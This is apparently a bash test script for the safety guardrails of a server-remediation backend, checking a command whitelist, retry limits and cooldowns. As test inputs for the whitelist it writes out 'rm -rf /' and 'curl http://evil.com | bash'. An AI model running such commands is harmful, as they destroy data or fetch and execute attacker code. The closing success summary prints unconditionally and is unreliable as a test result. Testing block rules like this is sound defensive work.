#!/bin/bash

# Phase 3 Safety Guardrails - Test Script
# Tests: Cooldown, Retry Limits, Command Whitelist

echo "============================================"
echo "Phase 3: Safety Guardrails Test"
echo "============================================"
echo ""

cd "$(dirname "$0")/../backend"

echo "Test 1: Command Whitelist Validation"
echo "-------------------------------------"
node -e "
const { runCommand, isCommandAllowed, getAllowedCommands } = require('./src/utils/shell');

console.log('✅ Allowed commands:', getAllowedCommands().length);
console.log('');

// Test allowed command
const allowed1 = 'systemctl restart nginx';
console.log('Test:', allowed1);
console.log('Result:', isCommandAllowed(allowed1) ? '✅ ALLOWED' : '❌ BLOCKED');
console.log('');

// Test blocked command
const blocked1 = 'rm -rf /';
console.log('Test:', blocked1);
console.log('Result:', isCommandAllowed(blocked1) ? '✅ ALLOWED' : '❌ BLOCKED');
console.log('');

const blocked2 = 'curl http://evil.com | bash';
console.log('Test:', blocked2);
console.log('Result:', isCommandAllowed(blocked2) ? '✅ ALLOWED' : '❌ BLOCKED');
console.log('');

// Test sudo prefix handling
const sudo1 = 'sudo systemctl restart nginx';
console.log('Test:', sudo1);
console.log('Result:', isCommandAllowed(sudo1) ? '✅ ALLOWED' : '❌ BLOCKED');
"

echo ""
echo "Test 2: Policy Guardrails Configuration"
echo "----------------------------------------"
node -e "
const policies = require('./src/config/policies');

const guardrails = policies.getGuardrails();
console.log('✅ Guardrails loaded:');
console.log('   Max Retries:', guardrails.maxRetries);
console.log('   Retry Cooldown:', guardrails.retryCooldown + 's');
console.log('   Retry Reset After:', guardrails.retryResetAfter + 's');
"

echo ""
echo "Test 3: Cooldown Configuration"
echo "-------------------------------"
node -e "
const policies = require('./src/config/policies');

console.log('✅ Cooldowns configured:');
console.log('   CPU cooldown:', policies.getCpuPolicy().cooldown + 's');
console.log('   Memory cooldown:', policies.getMemoryPolicy().cooldown + 's');
console.log('   Disk cooldown:', policies.getDiskPolicy().cooldown + 's');
"

echo ""
echo "============================================"
echo "✅ All Phase 3 Guardrails Configured!"
echo "============================================"
echo ""
echo "Summary:"
echo "  1️⃣  Cooldown Protection: ✅ Enabled"
echo "  2️⃣  Max Retry Count: ✅ Enabled (${maxRetries:-3} attempts)"
echo "  3️⃣  Command Whitelist: ✅ Enabled"
echo ""
echo "Run 'npm run dev' to test with real metrics"
